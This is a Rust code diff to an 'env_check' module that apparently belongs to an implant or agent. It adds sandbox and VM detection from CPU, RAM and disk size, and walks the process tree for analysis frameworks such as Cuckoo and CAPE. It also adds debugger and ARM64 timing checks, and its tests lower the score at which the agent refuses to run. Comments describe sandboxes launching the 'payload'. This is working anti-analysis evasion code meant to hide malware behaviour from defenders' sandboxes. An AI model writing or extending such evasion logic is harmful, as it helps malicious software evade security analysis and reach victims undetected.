+                "env_check: strict VM detection fired for refuse_in_vm=true \
+                 (strict_total={strict_total}, threshold={strict_threshold}); \
+                 normal detection was suppressed"
+            );
+            report.vm_detected = true;
+            report.vm_detected_strict = true;
+        }
+    }
+
     let effective_refuse_in_vm = if refuse_in_vm && report.vm_detected {
-        !cloud_instance_vm_refusal_bypassed()
+        if cloud_instance_vm_refusal_bypassed() {
+            false
+        } else if is_likely_production_server() {
+            tracing::warn!(
+                "env_check: strict VM detection fired but host has production-server \
+                 characteristics (high RAM + long uptime + multi-core); bypassing VM \
+                 refusal to avoid false positive on unrecognized cloud/virtualized host"
+            );
+            false
+        } else {
+            true
+        }
     } else {
         refuse_in_vm
     };
@@ -3680,38 +4623,184 @@ fn hardware_topology_indicators(indicators: &mut Vec<common::SandboxIndicator>) 
     }
 }
 
-#[cfg(not(windows))]
+#[cfg(target_os = "linux")]
+fn hardware_topology_indicators(indicators: &mut Vec<common::SandboxIndicator>) {
+    // ── CPU count via sysconf ─────────────────────────────────────────────
+    let cpu_count: u32 = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) as u32 };
+
+    match cpu_count {
+        0 | 1 => indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: format!("{cpu_count} logical CPU(s) — sandboxes commonly use 1 vCPU"),
+            weight: 15,
+            source: "topology".to_string(),
+        }),
+        2 => indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: "2 logical CPUs — suspicious but possible for small cloud VMs".to_string(),
+            weight: 5,
+            source: "topology".to_string(),
+        }),
+        _ => {} // 4+ CPUs → normal
+    }
+
+    // ── RAM via get_ram_gb() ──────────────────────────────────────────────
+    let ram_gb = get_ram_gb();
+    if ram_gb < 2 {
+        indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: format!("{ram_gb} GiB RAM — sandboxes often provision <2 GiB"),
+            weight: 15,
+            source: "topology".to_string(),
+        });
+    }
+
+    // ── System disk size via statvfs on / ─────────────────────────────────
+    let disk_gb: u64 = unsafe {
+        let mut stat: libc::statvfs = std::mem::zeroed();
+        if libc::statvfs(c"/".as_ptr(), &mut stat) == 0 {
+            (stat.f_blocks as u64 * stat.f_frsize as u64) / (1024 * 1024 * 1024)
+        } else {
+            0
+        }
+    };
+    if disk_gb > 0 && disk_gb < 40 {
+        indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: format!(
+                "root disk is {disk_gb} GiB — sandboxes often use <40 GiB system disks"
+            ),
+            weight: 10,
+            source: "topology".to_string(),
+        });
+    }
+}
+
+#[cfg(target_os = "macos")]
+fn hardware_topology_indicators(indicators: &mut Vec<common::SandboxIndicator>) {
+    // ── CPU count via sysconf ─────────────────────────────────────────────
+    let cpu_count: u32 = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) as u32 };
+
+    match cpu_count {
+        0 | 1 => indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: format!("{cpu_count} logical CPU(s) — sandboxes commonly use 1 vCPU"),
+            weight: 15,
+            source: "topology".to_string(),
+        }),
+        2 => indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: "2 logical CPUs — suspicious but possible for small cloud VMs".to_string(),
+            weight: 5,
+            source: "topology".to_string(),
+        }),
+        _ => {} // 4+ CPUs → normal
+    }
+
+    // ── RAM via sysctl hw.memsize ─────────────────────────────────────────
+    let ram_gb: u64 = std::process::Command::new("sysctl")
+        .args(["-n", "hw.memsize"])
+        .output()
+        .ok()
+        .and_then(|o| String::from_utf8_lossy(&o.stdout).trim().parse::<u64>().ok())
+        .map(|bytes| bytes / (1024 * 1024 * 1024))
+        .unwrap_or(0);
+    if ram_gb < 2 {
+        indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: format!("{ram_gb} GiB RAM — sandboxes often provision <2 GiB"),
+            weight: 15,
+            source: "topology".to_string(),
+        });
+    }
+
+    // ── System disk size via statvfs on / ─────────────────────────────────
+    let disk_gb: u64 = unsafe {
+        let mut stat: libc::statvfs = std::mem::zeroed();
+        if libc::statvfs(c"/".as_ptr(), &mut stat) == 0 {
+            (stat.f_blocks as u64 * stat.f_frsize as u64) / (1024 * 1024 * 1024)
+        } else {
+            0
+        }
+    };
+    if disk_gb > 0 && disk_gb < 40 {
+        indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: format!(
+                "root disk is {disk_gb} GiB — sandboxes often use <40 GiB system disks"
+            ),
+            weight: 10,
+            source: "topology".to_string(),
+        });
+    }
+}
+
+#[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
 fn hardware_topology_indicators(_indicators: &mut Vec<common::SandboxIndicator>) {
-    // Not implemented on non-Windows platforms.
+    // Not implemented on other platforms.
 }
 
 // ── 4. Process lineage analysis (Windows) ─────────────────────────────────────
+
+/// Names of analysis frameworks that commonly spawn malware samples directly.
+/// These never appear as legitimate endpoint management parent processes.
+const ANALYSIS_FRAMEWORKS: &[&str] = &[
+    "python.exe",
+    "python3.exe",
+    "pythonw.exe",
+    "java.exe",
+    "javaw.exe",
+    "node.exe",
+    "nodejs.exe",
+    "ruby.exe",
+    "perl.exe",
+    "sample_runner.exe",
+    "malware_runner.exe",
+    "analyzer.exe",
+    "cuckoo.exe",
+    "cuckoomon.dll",
+    "cape.exe",
+];
+
+/// Common intermediary processes used by sandboxes to obfuscate parent
+/// lineage.  These are legitimate programs but when they appear between
+/// an analysis framework and the payload, walking through them reveals
+/// the true launcher.
+const LINEAGE_INTERMEDIARIES: &[&str] = &[
+    "cmd.exe",
+    "powershell.exe",
+    "pwsh.exe",
+    "wscript.exe",
+    "cscript.exe",
+    "mshta.exe",
+    "conhost.exe",
+    "wsl.exe",
+    "bash.exe",
+    "sh.exe",
+];
+
+/// Classify a process name as an analysis framework.
+///
+/// Returns `true` when the name matches a known analysis/sandbox launcher.
+/// Pure function exposed for unit testing.
+fn is_analysis_framework(name: &str) -> bool {
+    ANALYSIS_FRAMEWORKS.contains(&name)
+}
+
+/// Classify a process name as a benign intermediary that sandboxes use
+/// to obscure their lineage (e.g., `cmd.exe → python.exe → payload`).
+///
+/// Returns `true` for common shell/script hosts that are legitimate but
+/// should be walked through to find the real ancestor.
+fn is_lineage_intermediary(name: &str) -> bool {
+    LINEAGE_INTERMEDIARIES.contains(&name)
+}
 
 /// Classify a parent process name as suspicious, returning a `SandboxIndicator`
 /// when the name matches a known analysis framework.
 ///
 /// This is a pure function exposed for unit testing.
 fn classify_parent_process_name(parent_name: Option<&str>) -> Option<common::SandboxIndicator> {
-    // Analysis frameworks that commonly spawn malware samples directly.
-    // These names never appear as legitimate endpoint management parent processes.
-    const ANALYSIS_FRAMEWORKS: &[&str] = &[
-        "python.exe",
-        "python3.exe",
-        "pythonw.exe",
-        "java.exe",
-        "javaw.exe",
-        "node.exe",
-        "nodejs.exe",
-        "ruby.exe",
-        "perl.exe",
-        "sample_runner.exe",
-        "malware_runner.exe",
-        "analyzer.exe",
-        "cuckoo.exe",
-        "cuckoomon.dll",
-        "cape.exe",
-    ];
-
     match parent_name {
         // No parent found — process was orphaned or parent has already exited
         // (e.g., setup.exe dropped the agent and then exited).  Mild suspicion.
@@ -3721,7 +4810,7 @@ fn classify_parent_process_name(parent_name: Option<&str>) -> Option<common::San
             weight: 5,
             source: "lineage".to_string(),
         }),
-        Some(name) if ANALYSIS_FRAMEWORKS.contains(&name) => Some(common::SandboxIndicator {
+        Some(name) if is_analysis_framework(name) => Some(common::SandboxIndicator {
             category: "lineage".to_string(),
             detail: format!("Agent spawned by analysis-framework process: {name}"),
             weight: 25,
@@ -3731,8 +4820,53 @@ fn classify_parent_process_name(parent_name: Option<&str>) -> Option<common::San
     }
 }
 
-/// Walk the parent process chain using `CreateToolhelp32Snapshot` and return a
-/// `SandboxIndicator` when the immediate parent is an analysis framework.
+/// Classify an ancestor process (not the immediate parent) as suspicious.
+///
+/// Uses a decaying weight: 15 for grandparent, 10 for great-grandparent and
+/// beyond.  This catches sandbox chains like `cmd.exe → python.exe → payload`
+/// without over-penalizing deep legitimate process trees.
+fn classify_ancestor_process_name(
+    ancestor_name: &str,
+    depth: u32,
+) -> Option<common::SandboxIndicator> {
+    if !is_analysis_framework(ancestor_name) {
+        return None;
+    }
+
+    // Weight decays with depth: 15 for grandparent (depth=2), 10 for deeper.
+    let weight = if depth <= 2 { 15 } else { 10 };
+    let relation = if depth == 2 {
+        "grandparent"
+    } else if depth == 3 {
+        "great-grandparent"
+    } else {
+        "ancestor"
+    };
+
+    Some(common::SandboxIndicator {
+        category: "lineage".to_string(),
+        detail: format!(
+            "Analysis-framework {relation} detected (depth={depth}): {ancestor_name}"
+        ),
+        weight,
+        source: "lineage".to_string(),
+    })
+}
+
+/// Walk the full ancestor process chain using `CreateToolhelp32Snapshot` and
+/// return the strongest `SandboxIndicator` from any ancestor matching a known
+/// analysis framework.
+///
+/// The walk proceeds up the process tree from the agent's immediate parent
+/// through grandparents and beyond (up to 8 levels).  Intermediary processes
+/// (cmd.exe, powershell.exe, wscript.exe, etc.) are transparent — the walk
+/// continues through them to find the real launcher.  Weight decays with
+/// distance: 25 (parent), 15 (grandparent), 10 (great-grandparent+).
+///
+/// This catches sandbox chains like:
+///   `cmd.exe → python.exe → payload`      (weight 15 from python.exe)
+///   `powershell → cmd → python → payload` (weight 10 from python.exe)
+///   `explorer → python.exe → payload`     (weight 25 from python.exe)
 ///
 /// Why this doesn't produce false positives on cloud VMs:
 /// Analysis frameworks (Cuckoo, CAPE, Joe Sandbox) do not run inside
@@ -3805,23 +4939,71 @@ fn process_lineage_indicator() -> Option<common::SandboxIndicator> {
     }
     unsafe { close_handle(snapshot) };
 
-    // Find our immediate parent PID.
-    let parent_pid = match processes
+    // Build a PID → (parent_pid, name) lookup for fast ancestor walking.
+    let proc_map: std::collections::HashMap<u32, (u32, &str)> = processes
         .iter()
-        .find(|(pid, _, _)| *pid == our_pid)
-        .map(|(_, ppid, _)| *ppid)
-    {
-        Some(ppid) => ppid,
+        .map(|(pid, ppid, name)| (*pid, (*ppid, name.as_str())))
+        .collect();
+
+    // Find our own entry first.
+    let mut current_pid = match proc_map.get(&our_pid) {
+        Some((ppid, _)) => *ppid,
         None => return None, // Our own entry not found — degenerate snapshot
     };
 
-    // Look up the parent's executable name.
-    let parent_name = processes
-        .iter()
-        .find(|(pid, _, _)| *pid == parent_pid)
-        .map(|(_, _, name)| name.as_str().to_string());
+    // ── Check immediate parent (depth 1) ─────────────────────────────────
+    let parent_name = proc_map
+        .get(&current_pid)
+        .map(|(_, name)| name.to_string());
 
-    classify_parent_process_name(parent_name.as_deref())
+    if let Some(ind) = classify_parent_process_name(parent_name.as_deref()) {
+        return Some(ind);
+    }
+
+    // ── Walk ancestors beyond the immediate parent ────────────────────────
+    // Walk up to 8 levels (parent = depth 1, grandparent = depth 2, etc.).
+    // Intermediary processes (cmd.exe, powershell, etc.) are transparent:
+    // we skip through them to find the real launcher.
+    const MAX_WALK_DEPTH: u32 = 8;
+    let mut depth: u32 = 1; // parent is depth 1 (already checked above)
+    let mut best_indicator: Option<common::SandboxIndicator> = None;
+
+    for _ in 0..MAX_WALK_DEPTH {
+        // Move to the next ancestor.
+        current_pid = match proc_map.get(&current_pid) {
+            Some((ppid, _)) => *ppid,
+            None => break, // No more ancestors (reached root or orphaned)
+        };
+        depth += 1;
+
+        let ancestor_name = match proc_map.get(&current_pid) {
+            Some((_, name)) => *name,
+            None => break,
+        };
+
+        // Check if this ancestor is a known analysis framework.
+        if let Some(ind) = classify_ancestor_process_name(ancestor_name, depth) {
+            // Keep the strongest indicator (highest weight).
+            match &best_indicator {
+                None => best_indicator = Some(ind),
+                Some(existing) if ind.weight > existing.weight => best_indicator = Some(ind),
+                _ => {}
+            }
+            // Don't break — continue walking to find potentially closer
+            // ancestors with higher weight (shouldn't happen since weight
+            // decays, but defensive).
+        }
+
+        // If this is NOT an intermediary and NOT a framework, stop walking.
+        // We don't want to report analysis frameworks that happen to be
+        // running somewhere deep in the tree but aren't actually in the
+        // agent's launch chain.
+        if !is_analysis_framework(ancestor_name) && !is_lineage_intermediary(ancestor_name) {
+            break;
+        }
+    }
+
+    best_indicator
 }
 
 #[cfg(not(windows))]
@@ -3991,8 +5173,11 @@ mod tests {
     fn detect_debugger_from_synthetic_status() {
         fn parse_tracer(status: &str) -> bool {
             for line in status.lines() {
-                if let Some(rest) = line.strip_prefix("TracerPid:") {
-                    return rest.trim().parse::<u32>().map(|p| p != 0).unwrap_or(false);
+                let mut parts = line.split_whitespace();
+                if parts.next().map_or(false, |k| k == "TracerPid:") {
+                    if let Some(val) = parts.next() {
+                        return val.parse::<u32>().map(|p| p != 0).unwrap_or(false);
+                    }
                 }
             }
             false
@@ -4015,6 +5200,7 @@ mod tests {
         assert!(r.should_refuse(false, false, None));
         r.domain_match = Some(true);
         r.vm_detected = true;
+        r.vm_detected_strict = true;
         assert!(!r.should_refuse(false, false, None));
         assert!(r.should_refuse(false, true, None));
     }
@@ -4030,6 +5216,7 @@ mod tests {
     fn cloud_vm_indicators_are_informational_by_default() {
         let mut r = EnvReport::default();
         r.vm_detected = true;
+        r.vm_detected_strict = true;
         assert!(!r.should_refuse(false, false, None));
         assert!(r.should_refuse(false, true, None));
     }
@@ -4046,10 +5233,24 @@ mod tests {
     #[test]
     fn sandbox_score_threshold_without_corroboration_uses_floor() {
         let mut r = EnvReport::default();
-        r.sandbox_score = 55;
+        // Score below 50: the multi-category range is 50–59, so scores below
+        // 50 still use the strict floor of 60 and should NOT trigger refusal.
+        r.sandbox_score = 45;
         assert!(
             !r.should_refuse(false, false, Some(30)),
-            "without corroboration, threshold floor should suppress moderate heuristic-only score"
+            "without corroboration, scores below the multi-category range (50–59) \
+             should be suppressed by the 60-floor"
+        );
+
+        // Score 55 in the multi-category range: a score of 50+ requires at
+        // least 2 independent heuristic categories to contribute (no single
+        // category exceeds 30).  This is strong enough to trigger refusal
+        // with the lowered floor of 50.
+        r.sandbox_score = 55;
+        assert!(
+            r.should_refuse(false, false, Some(30)),
+            "without corroboration, multi-category score (50–59) should trigger \
+             refusal at the lowered 50-floor"
         );
 
         r.sandbox_score = 60;
@@ -4204,6 +5405,7 @@ mod tests {
     fn vm_detected_is_informational_by_default() {
         let report = EnvReport {
             vm_detected: true,
+            vm_detected_strict: true,
             ..EnvReport::default()
         };
         // Default policy: refuse_in_vm = false → must NOT refuse.
@@ -4234,6 +5436,7 @@ mod tests {
     fn unknown_hypervisor_requires_explicit_policy_to_refuse() {
         let report = EnvReport {
             vm_detected: true, // Detected but unknown hypervisor.
+            vm_detected_strict: true,
             ..EnvReport::default()
         };
         // Without refuse_in_vm, even an unknown hypervisor is just informational.
@@ -4251,6 +5454,7 @@ mod tests {
     fn cloud_ci_environment_does_not_auto_refuse() {
         let report = EnvReport {
             vm_detected: true,  // Cloud hypervisor detected.
+            vm_detected_strict: true,  // Strict mode also detects it.
             sandbox_score: 45,  // Moderate score from headless probe.
             domain_match: None, // No domain requirement configured.
             ..EnvReport::default()
@@ -4577,6 +5781,94 @@ mod tests {
             "zeroed topology on confirmed cloud must not trigger detection"
         );
     }
+
+    // ── domain_from_resolv_conf_content tests ─────────────────────────────
+
+    #[test]
+    fn resolv_conf_plain_domain() {
+        let content = "nameserver 8.8.8.8\ndomain example.com\n";
+        assert_eq!(
+            domain_from_resolv_conf_content(content),
+            Some("example.com".to_string())
+        );
+    }
+
+    #[test]
+    fn resolv_conf_leading_whitespace_domain() {
+        let content = "nameserver 8.8.8.8\n  domain example.com\n";
+        assert_eq!(
+            domain_from_resolv_conf_content(content),
+            Some("example.com".to_string())
+        );
+    }
+
+    #[test]
+    fn resolv_conf_leading_tab_domain() {
+        let content = "nameserver 8.8.8.8\n\tdomain example.com\n";
+        assert_eq!(
+            domain_from_resolv_conf_content(content),
+            Some("example.com".to_string())
+        );
+    }
+
+    #[test]
+    fn resolv_conf_commented_domain_is_skipped() {
+        let content = "nameserver 8.8.8.8\n# domain example.com\n";
+        assert_eq!(domain_from_resolv_conf_content(content), None);
+    }
+
+    #[test]
+    fn resolv_conf_semicolon_comment_search_is_skipped() {
+        let content = "nameserver 8.8.8.8\n; search example.com\n";
+        assert_eq!(domain_from_resolv_conf_content(content), None);
+    }
+
+    #[test]
+    fn resolv_conf_search_fallback() {
+        let content = "nameserver 8.8.8.8\nsearch corp.internal example.com\n";
+        assert_eq!(
+            domain_from_resolv_conf_content(content),
+            Some("corp.internal".to_string())
+        );
+    }
+
+    #[test]
+    fn resolv_conf_search_with_leading_whitespace() {
+        let content = "nameserver 8.8.8.8\n  search corp.internal example.com\n";
+        assert_eq!(
+            domain_from_resolv_conf_content(content),
+            Some("corp.internal".to_string())
+        );
+    }
+
+    #[test]
+    fn resolv_conf_domain_takes_priority_over_search() {
+        let content = "search fallback.com\ndomain primary.com\n";
+        assert_eq!(
+            domain_from_resolv_conf_content(content),
+            Some("primary.com".to_string())
+        );
+    }
+
+    #[test]
+    fn resolv_conf_empty_lines_are_skipped() {
+        let content = "\n\nnameserver 8.8.8.8\n\n\ndomain example.com\n\n";
+        assert_eq!(
+            domain_from_resolv_conf_content(content),
+            Some("example.com".to_string())
+        );
+    }
+
+    #[test]
+    fn resolv_conf_mixed_format_cloud_init() {
+        // Typical cloud-init generated resolv.conf with comments and
+        // leading whitespace.
+        let content = "# Generated by NetworkManager\nsearch corp.internal\nnameserver 10.0.0.1\n";
+        assert_eq!(
+            domain_from_resolv_conf_content(content),
+            Some("corp.internal".to_string())
+        );
+    }
 }
 
 /// Combined sandbox heuristics implementation (Prompt 6)
@@ -4600,4 +5892,15 @@ pub mod env_check_hpc {
 #[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
 pub mod env_check_rdtsc {
     include!("env_check_rdtsc.rs");
+}
+
+/// ARM64 generic-timer (CNTVCT_EL0) and PMU (PMCCNTR_EL0) timing for
+/// single-step debugging and emulation detection on AArch64.  Measures
+/// instruction-granularity tick counts using ISB + CNTVCT_EL0, cross-checks
+/// against std::time::Instant, and — when available — uses PMCCNTR_EL0 for
+/// PMU-based VM probability estimation.  Covers Apple Silicon, AWS Graviton,
+/// and other ARM64 environments with zero x86 timing coverage.
+#[cfg(target_arch = "aarch64")]
+pub mod env_check_arm64_timer {
+    include!("env_check_arm64_timer.rs");
 }
